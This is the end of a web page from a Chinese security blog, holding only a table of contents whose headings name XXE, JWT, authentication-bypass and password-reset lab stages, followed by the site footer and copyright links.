class="toc-text">xxe 的 ddos</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2XXE"><span class="toc-text">盲XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-7"><span class="toc-text">Stage 7</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Authentication-Flaws"><span class="toc-text">Authentication Flaws</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Authentication-Bypasses"><span class="toc-text">Authentication Bypasses</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-2-1"><span class="toc-text">Stage 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT-tokens"><span class="toc-text">JWT tokens</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-4-1"><span class="toc-text">Stage 4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-5"><span class="toc-text">Stage 5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-7-1"><span class="toc-text">Stage 7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-8"><span class="toc-text">Stage 8</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-reset"><span class="toc-text">Password reset</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-2-question"><span class="toc-text">Stage 2 question</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-4-2"><span class="toc-text">Stage 4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stage-5-question"><span class="toc-text">Stage 5 question</span></a></li></ol></li></ol></li></ol></li></ol>
        
    </div>
</aside>

                
            </div>
        </div>
    </section>
    <footer class="main-footer">
    <div class="container">
        <div class="row">
        </div>
    </div>
</footer>

<a id="back-to-top" class="icon-btn hide">
	<i class="fa fa-chevron-up"></i>
</a>




    <div class="copyright">
    <div class="container">
        <div class="row">
            <div class="col-sm-12">
                <div class="busuanzi">
    
</div>

            </div>
            <div class="col-sm-12">
                <span>Copyright &copy; 2019-2025&emsp;<a href="/" class="copyright-links" target="_blank" rel="nofollow">Ljjyy.com</a>
                </span> |
                <span>
                    <a href="/about/" class="copyright-links" target="_blank" rel="nofollow">关于我们</a>
                </span> |                
                <span>
                    <a href="/sitemap.xml" class="copyright-links" target="_blank" rel="nofollow">网站地图</a>
                </span> |
                <span>
                    <a href="/archives/" class="copyright-links" target="_blank" rel="nofollow">时间轴</a>
                </span>              
            </div>
        </div>
    </div>
</div>








<script src="/js/app.js?rev=@@hash.js"></script>


</body>
</html>